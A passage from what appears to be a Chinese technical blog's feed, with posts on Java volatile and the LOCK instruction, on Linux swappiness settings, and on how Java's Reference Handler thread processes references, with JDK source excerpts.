&#123;&#125;</span><br></pre></td></tr></table></figure><p>再编译就好了!</p><p>至于安装, 他的<code>README</code>中已经说的很清楚了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">* Installing</span><br><span class="line"></span><br><span class="line">Products are named like build/$OS-$LIBARCH/hsdis-$LIBARCH.so.  You can</span><br><span class="line">install them on your LD_LIBRARY_PATH, or inside of your JRE/JDK.  The</span><br><span class="line">search path in the JVM is:</span><br><span class="line"></span><br><span class="line">1. &lt;home&gt;/jre/lib/&lt;arch&gt;/&lt;vm&gt;/libhsdis-&lt;arch&gt;.so</span><br><span class="line">2. &lt;home&gt;/jre/lib/&lt;arch&gt;/&lt;vm&gt;/hsdis-&lt;arch&gt;.so</span><br><span class="line">3. &lt;home&gt;/jre/lib/&lt;arch&gt;/hsdis-&lt;arch&gt;.so</span><br><span class="line">4. hsdis-&lt;arch&gt;.so  (using LD_LIBRARY_PATH)</span><br><span class="line"></span><br><span class="line">Note that there&apos;s a bug in hotspot versions prior to hs22 that causes</span><br><span class="line">steps 2 and 3 to fail when used with JDK7.</span><br><span class="line"></span><br><span class="line">Now test:</span><br><span class="line"></span><br><span class="line">  export LD_LIBRARY_PATH .../hsdis/build/$OS-$LIBARCH:$LD_LIBRARY_PATH</span><br><span class="line">  dargs=&apos;-XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly&apos;</span><br><span class="line">  dargs=$dargs&apos; -XX:PrintAssemblyOptions=hsdis-print-bytes&apos;</span><br><span class="line">  java $dargs -Xbatch CompileCommand=print,*String.hashCode HelloWorld</span><br><span class="line"></span><br><span class="line">If the product mode of the JVM does not accept -XX:+PrintAssembly,</span><br><span class="line">you do not have a version new enough to use the hsdis plugin.</span><br></pre></td></tr></table></figure><p>安装就是放到jvm能够加载到的路径上, 然后在jvm的启动参数中加入<code>-XX:+PrintAssembly -Xcomp</code></p><blockquote><p>参数-Xcomp是让虚拟机以编译模式执行代码，这样代码可以偷懒，不需要执行足够次数来预热都能触发JIT编译。</p></blockquote><p>可以看到输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> 0x00007f29294c0054: mov    %r12d,0xc(%rbp)</span><br><span class="line"> 0x00007f29294c0058: lock addl $0x0,(%rsp)     ;*putfield helper</span><br><span class="line">                                               ; - com.air.jvm.VolatileTest$Foo::&lt;init&gt;@6 (line 40)</span><br><span class="line">//...</span><br><span class="line"> 0x00007f2929504fdc: shr    $0x9,%rax</span><br><span class="line"> 0x00007f2929504fe0: mov    $0x7f2924e3f000,%rdi</span><br><span class="line"> 0x00007f2929504fea: movb   $0x0,(%rax,%rdi,1)</span><br><span class="line"> 0x00007f2929504fee: lock addl $0x0,(%rsp)     ;*putfield helper</span><br><span class="line">                                               ; - com.air.jvm.VolatileTest$Foo::getHelper@27 (line 45)</span><br></pre></td></tr></table></figure><p>可以看到多出了一行 “lock addl $0x0,(%rsp)”，这行代码只是对 stack pointer 加 0，无含义。<br>但 LOCK prefix 的指令会触发处理器做特殊的操作，查看 Intel 64 and IA-32 架构开发手册的相关资料：</p><p>“Synchronization mechanisms in multiple-processor systems may depend upon a strong memory-ordering model. Here, a program can use a locking instruction such as the XCHG instruction or the LOCK prefix to ensure that a read-modify-write operation on memory is carried out atomically. Locking operations typically operate like I/O operations in that they wait for all previous instructions to complete and for all buffered writes to drain to memory.”</p><p>LOCK prefix 会触发 CPU 缓存回写到内存，而后通过 CPU 缓存一致性机制，使得其它线程能够看到最新的共享变量，实现了共享变量对于所有 CPU 的可见性。</p><img src="/2018/07/08/volatile/cpu-cache.jpg"><h3 id="new-Test-做了什么"><a href="#new-Test-做了什么" class="headerlink" title="new Test()做了什么"></a><code>new Test()</code>做了什么</h3><p>参考R大在知乎上的解答:</p><blockquote><p><code>new Test()</code><br>这个表达式的作用是：</p><ol><li>创建并默认初始化一个Test类型的对象</li><li>调用Test类的signature为 <init>()V 的构造器</init></li><li>表达式的值为一个指向这个新建对家的引用。</li></ol></blockquote><p>对应到上面的字节码, 我们从同步块的<code>monitorenter</code>和<code>monitorexit</code>找到<code>new</code>对应的字节码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>: monitorenter</span><br><span class="line"><span class="number">11</span>: aload_0</span><br><span class="line">12: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line"><span class="number">15</span>: ifnonnull     <span class="number">30</span></span><br><span class="line"><span class="comment">//-------------------------------------</span></span><br><span class="line"><span class="number">18</span>: aload_0</span><br><span class="line">19: new           #3                  // class Foo$Helper</span><br><span class="line"><span class="number">22</span>: dup</span><br><span class="line"><span class="number">23</span>: aload_0</span><br><span class="line">24: invokespecial #4                  // Method Foo$Helper."&lt;init&gt;":(LFoo;)V</span><br><span class="line">27: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line"><span class="number">30</span>: aload_1</span><br><span class="line"><span class="comment">//-------------------------------------</span></span><br><span class="line"><span class="number">31</span>: monitorexit</span><br></pre></td></tr></table></figure><p>稍微补充下字节码的指令知识:</p><blockquote><p>aload_0 获取的是本地变量表中对象的引用，a代表引用类型，0表示本地表量表中变量的索引，通常0这个位置的引用，一般都是 this 对象。iload_0 获取的是 下标为 0 的整数类型。<br>invokespecial会消耗掉操作数栈顶的引用作为传给构造器的“this”参数，所以如果我们希望在invokespecial调用后在操作数栈顶还维持有一个指向新建对象的引用，就得在invokespecial之前先“复制”一份引用——这就是这个dup的来源<br>可以看到，new字节码指令的作用是, 创建指定类型的对象实例、对其进行默认初始化，并且将指向该实例的一个引用压入操作数栈顶；</p></blockquote><p>因为<code>new</code>操作并不是一个原子的操作, 他是分了三步的, 如果没有volatile, 这里就有可能发生重排序, 导致另外的线程拿到的是一个初始化了一半的对象.</p><h2 id="JMM规范"><a href="#JMM规范" class="headerlink" title="JMM规范"></a>JMM规范</h2><p><code>JMM</code>(JSR-133)规定了每个线程都有一个工作内存, </p><blockquote><p>Every thread is defined to have a working memory (an abstraction of caches and registers) in which to store values.<br>线程的工作内存, 理解为cpu的cache或者register就行了. </p></blockquote><img src="/2018/07/08/volatile/cache.gif" title="cpu的cache"><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/" rel="external nofollow noopener noreferrer" target="_blank">The Java Memory Model</a></li><li><a href="http://gee.cs.oswego.edu/dl/cpj/jmm.html" rel="external nofollow noopener noreferrer" target="_blank">Synchronization and the Java Memory Model</a></li><li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/CommunityReview.pdf" rel="external nofollow noopener noreferrer" target="_blank">JSR-133</a></li><li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html" rel="external nofollow noopener noreferrer" target="_blank">The “Double-Checked Locking is Broken” Declaration</a></li><li><a href="https://www.zhihu.com/question/52749416" rel="external nofollow noopener noreferrer" target="_blank">关于JVM字节码中dup指令的问题？ - 知乎</a></li><li><a href="https://tech.meituan.com/java-memory-reordering.html" rel="external nofollow noopener noreferrer" target="_blank">Java内存访问重排序的研究 -</a></li><li><a href="https://blog.csdn.net/Marvel__Dead/article/details/75193914" rel="external nofollow noopener noreferrer" target="_blank">字节码指令级别从i++说到volatile，深入理解i++的线程安全问题 - CSDN博客</a></li><li><a href="https://stackoverflow.com/questions/8891067/what-does-the-lock-instruction-mean-in-x86-assembly" rel="external nofollow noopener noreferrer" target="_blank">c++ - What does the “lock” instruction mean in x86 assembly? - Stack Overflow</a></li><li><a href="https://stackoverflow.com/questions/19652824/why-can-memorybarrier-be-implemented-as-a-call-to-xchg" rel="external nofollow noopener noreferrer" target="_blank">windows - why can MemoryBarrier be implemented as a call to xchg? - Stack Overflow</a></li><li><a href="https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html" rel="external nofollow noopener noreferrer" target="_blank">Intel® 64 and IA-32 Architectures Developer’s Manual: Vol. 3A</a></li><li><a href="http://gee.cs.oswego.edu/dl/cpj/jmm.html" rel="external nofollow noopener noreferrer" target="_blank">Synchronization and the Java Memory Model</a></li><li><a href="http://www.cnblogs.com/dolphin0520/p/3920373.html" rel="external nofollow noopener noreferrer" target="_blank">Java并发编程：volatile关键字解析 - 海 子 - 博客园</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;结论&quot;&gt;&lt;a href=&quot;#结论&quot; class=&quot;headerlink&quot; title=&quot;结论&quot;&gt;&lt;/a&gt;结论&lt;/h2&gt;&lt;p&gt;volatile的作用:&lt;/p&gt;
&lt;p&gt;1.保证多个线程”同时”修改”共享”变量时不会因为cpu cache等原因而造成不一致,  &lt;/p&gt;
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="volatile" scheme="http://qsli.github.io/tags/volatile/"/>
    
  </entry>
  
  <entry>
    <title>swappiness</title>
    <link href="http://qsli.github.io/2018/07/08/swap/"/>
    <id>http://qsli.github.io/2018/07/08/swap/</id>
    <published>2018-07-08T07:56:57.000Z</published>
    <updated>2018-08-11T12:42:42.754Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sysctl中和swap相关的参数"><a href="#sysctl中和swap相关的参数" class="headerlink" title="sysctl中和swap相关的参数"></a>sysctl中和swap相关的参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo sysctl -a  | grep swap</span><br><span class="line">vm.swappiness = 0</span><br></pre></td></tr></table></figure><blockquote><p>Swappiness is a Linux kernel parameter that controls the relative weight given to swapping out of runtime memory, as opposed to dropping pages from the system page cache. Swappiness can be set to values between 0 and 100 inclusive. A low value causes the kernel to avoid swapping; a higher value causes the kernel to try to use swap space.<br>取值说明:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vm.swappiness = 0，表示只有在避免OOM的时候才进行swap操作；(并不是关闭swap)</span><br><span class="line">vm.swappiness = 60，系统默认值；</span><br><span class="line">vm.swappiness = 100，系统主动的进行swap操作。</span><br></pre></td></tr></table></figure><h2 id="关闭swap"><a href="#关闭swap" class="headerlink" title="关闭swap"></a>关闭swap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/vm/swappiness</span><br><span class="line">sudo echo 0 | sudo tee /proc/sys/vm/swappiness</span><br><span class="line">sudo swapoff/swapon -a</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDcyMTQyNQ==&amp;mid=206046053&amp;idx=1&amp;sn=76f7a31003d80c3089c3a266e4b139e0&amp;3rd=MzA3MDU4NTYzMw==&amp;scene=6#rd" rel="external nofollow noopener noreferrer" target="_blank">Qunar技术沙龙</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;sysctl中和swap相关的参数&quot;&gt;&lt;a href=&quot;#sysctl中和swap相关的参数&quot; class=&quot;headerlink&quot; title=&quot;sysctl中和swap相关的参数&quot;&gt;&lt;/a&gt;sysctl中和swap相关的参数&lt;/h2&gt;&lt;figure class
      
    
    </summary>
    
      <category term="linux" scheme="http://qsli.github.io/categories/linux/"/>
    
    
      <category term="swap" scheme="http://qsli.github.io/tags/swap/"/>
    
  </entry>
  
  <entry>
    <title>java中的引用</title>
    <link href="http://qsli.github.io/2018/07/08/reference/"/>
    <id>http://qsli.github.io/2018/07/08/reference/</id>
    <published>2018-07-07T18:03:55.000Z</published>
    <updated>2018-08-11T12:42:42.520Z</updated>
    
    <content type="html"><![CDATA[<h2 id="jvm中的Reference-Handler线程"><a href="#jvm中的Reference-Handler线程" class="headerlink" title="jvm中的Reference Handler线程"></a>jvm中的<code>Reference Handler</code>线程</h2><p>经常看<code>jstack</code>的输出就会发现一个常见的线程 – <code>Reference Handler</code>, 堆栈如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;Reference Handler&quot; #2 daemon prio=10 os_prio=0 tid=0x00007f873013e000 nid=0x18d7 in Object.wait() [0x00007f873443b000]</span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">at java.lang.Object.wait(Native Method)</span><br><span class="line">at java.lang.Object.wait(Object.java:502)</span><br><span class="line">at java.lang.ref.Reference.tryHandlePending(Reference.java:191)</span><br><span class="line">- locked &lt;0x00000000e0e1e9b8&gt; (a java.lang.ref.Reference$Lock)</span><br><span class="line">at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)</span><br><span class="line"></span><br><span class="line">&quot;VM Thread&quot; os_prio=0 tid=0x00007f8730136800 nid=0x18d6 runnable</span><br></pre></td></tr></table></figure><p>看线程栈, 执行到<code>Reference</code>下的<code>tryHandlePending</code>方法就成了<code>WAIT</code>状态, 带着好奇心去翻翻源码.</p><h3 id="何时启动"><a href="#何时启动" class="headerlink" title="何时启动?"></a>何时启动?</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reference类中的静态代码块</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line">        ThreadGroup tg = Thread.currentThread().getThreadGroup();</span><br><span class="line">        <span class="keyword">for</span> (ThreadGroup tgn = tg;</span><br><span class="line">             tgn != <span class="keyword">null</span>;</span><br><span class="line">             tg = tgn, tgn = tg.getParent());</span><br><span class="line">        <span class="comment">// 这里创建线程, 传入线程group和线程的名称, 堆栈中的名称就来自于此</span></span><br><span class="line">        Thread handler = <span class="keyword">new</span> ReferenceHandler(tg, <span class="string">"Reference Handler"</span>);</span><br><span class="line">        <span class="comment">/* If there were a special system-only priority greater than</span></span><br><span class="line"><span class="comment">         * MAX_PRIORITY, it would be used here</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        handler.setPriority(Thread.MAX_PRIORITY);</span><br><span class="line">        handler.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">        handler.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// provide access in SharedSecrets</span></span><br><span class="line">        SharedSecrets.setJavaLangRefAccess(<span class="keyword">new</span> JavaLangRefAccess() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryHandlePendingReference</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> tryHandlePending(<span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>Reference</code>在被加载的时候就会触发<code>static</code>里的代码执行, 就会创建<code>Reference Handler</code>线程并启动.<br>至于<code>SharedSecrets</code>, 这个类类似一个Holder, 保存了一些对象的引用, 并提供了一些get/set方法.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SharedSecrets</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe unsafe = Unsafe.getUnsafe();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaUtilJarAccess javaUtilJarAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaLangAccess javaLangAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaLangRefAccess javaLangRefAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaIOAccess javaIOAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNetAccess javaNetAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNetHttpCookieAccess javaNetHttpCookieAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNioAccess javaNioAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaIOFileDescriptorAccess javaIOFileDescriptorAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaSecurityProtectionDomainAccess javaSecurityProtectionDomainAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaSecurityAccess javaSecurityAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaUtilZipFileAccess javaUtilZipFileAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaAWTAccess javaAWTAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaObjectInputStreamAccess javaObjectInputStreamAccess;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SharedSecrets</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// getter和setter方法省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="这个线程做了什么"><a href="#这个线程做了什么" class="headerlink" title="这个线程做了什么?"></a>这个线程做了什么?</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java.lang.ref.Reference.ReferenceHandler</span></span><br><span class="line">  <span class="comment">/* High-priority thread to enqueue pending References</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ReferenceHandler</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 采用反射的方式触发类的加载</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(clazz.getName(), <span class="keyword">true</span>, clazz.getClassLoader());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (Error) <span class="keyword">new</span> NoClassDefFoundError(e.getMessage()).initCause(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            <span class="comment">// pre-load and initialize InterruptedException and Cleaner classes</span></span><br><span class="line">            <span class="comment">// so that we don't get into trouble later in the run loop if there's</span></span><br><span class="line">            <span class="comment">// memory shortage while loading/initializing them lazily.</span></span><br><span class="line">            ensureClassInitialized(InterruptedException<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            <span class="comment">// 和DirectMemory相关的Cleaner类</span></span><br><span class="line">            ensureClassInitialized(Cleaner<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ReferenceHandler(ThreadGroup g, String name) &#123;</span><br><span class="line">            <span class="keyword">super</span>(g, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="comment">// 调用Reference类的方法</span></span><br><span class="line">                tryHandlePending(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个线程其实只是在死循环中调用了<code>Reference</code>的<code>tryHandlePending</code>来清理无效的<code>Reference</code>.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Java中有四种引用, <code>StrongReference</code>, <code>SoftReference</code>, <code>WeakReference</code>, <code>PhantomReference</code>, 除了<code>StrongReference</code>其他的三种都有对应的类:</p><img src="/2018/07/08/reference/reference.jpg" title="Reference"><h3 id="引用的状态"><a href="#引用的状态" class="headerlink" title="引用的状态"></a>引用的状态</h3><ul><li><code>Active</code>: Newly-created instances are Active.</li><li><code>Pending</code>: An element of the pending-Reference list, waiting to be enqueued by the Reference-handler thread.  Unregistered instances are never in this state.(没有注册ReferenceQueue的不会有这个状态)</li><li><code>Enqueued</code>: An element of the queue with which the instance was registered when it was created.  When an instance is removed from its ReferenceQueue, it is made Inactive. Unregistered instances are never in this state.(没有注册ReferenceQueue的不会有这个状态)</li><li><code>Inactive</code>: Nothing more to do.  Once an instance becomes Inactive its state will never change again.(终态)</li></ul><h3 id="引用链表"><a href="#引用链表" class="headerlink" title="引用链表"></a>引用链表</h3><p><code>Reference</code>中有五个关键的变量:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> T referent;         <span class="comment">/* Treated specially by GC */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">volatile</span> ReferenceQueue&lt;? <span class="keyword">super</span> T&gt; queue;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* When active:   NULL</span></span><br><span class="line"><span class="comment">    *     pending:   this</span></span><br><span class="line"><span class="comment">    *    Enqueued:   next reference in queue (or this if last)</span></span><br><span class="line"><span class="comment">    *    Inactive:   this</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@SuppressWarnings</span>(<span class="string">"rawtypes"</span>)</span><br><span class="line">   Reference next;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* When active:   next element in a discovered reference list maintained by GC (or this if last)</span></span><br><span class="line"><span class="comment">    *     pending:   next element in the pending list (or null if last)</span></span><br><span class="line"><span class="comment">    *   otherwise:   NULL</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">transient</span> <span class="keyword">private</span> Reference&lt;T&gt; discovered;  <span class="comment">/* used by VM */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* List of References waiting to be enqueued.  The collector adds</span></span><br><span class="line"><span class="comment">    * References to this list, while the Reference-handler thread removes</span></span><br><span class="line"><span class="comment">    * them.  This list is protected by the above lock object. The</span></span><br><span class="line"><span class="comment">    * list uses the discovered field to link its elements.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> Reference&lt;Object&gt; pending = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><ul><li><p><code>referent</code></p><p>代表当前持有的引用. </p></li><li><p><code>queue</code></p><p>是初始化的时候传入的, 可以为null, 如果传入了<code>ReferenceQueue</code>, 会有入队列和出队列的操作</p></li><li><p><code>next</code></p><p>代表<code>ReferenceQueue</code>中的下一个, <code>Active</code>状态下是null,<br><code>Pending</code>和<code>Inactive</code>状态下指向自己, </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   +-------+</span><br><span class="line">   |       |</span><br><span class="line">   v       |</span><br><span class="line">           |</span><br><span class="line">+-----+    |</span><br><span class="line">|     |    |</span><br><span class="line">|  1  +----+</span><br><span class="line">|     |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p><code>Enqueued</code>状态下指向<code>queue</code>中的下一个元素</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">                         +-------+</span><br><span class="line">                         |       |</span><br><span class="line">                         v       |</span><br><span class="line">                                 |</span><br><span class="line">+-----+    +-----+    +-----+    |</span><br><span class="line">|     |    |     |    |     |    |</span><br><span class="line">|  1  +--&gt; |  2  +--&gt; |  3  +----+</span><br><span class="line">|     |    |     |    |     |</span><br><span class="line">+-----+    +-----+    +-----+</span><br></pre></td></tr></table></figure><ul><li><p><code>discovered</code></p><p><code>Active</code>状态下指向<code>discovered reference list</code>中的下一个元素,<br><code>Pending</code>状态下指向<code>pending list</code>中的下一个元素,<br>其他状态下是null, 相关的链表是JVM维护的</p></li><li><p><code>pending</code></p></li></ul><p><code>pending</code>指向的是<code>pending list</code>链表的head</p><h3 id="tryHandlePending"><a href="#tryHandlePending" class="headerlink" title="tryHandlePending"></a>tryHandlePending</h3><p>处理引用的代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 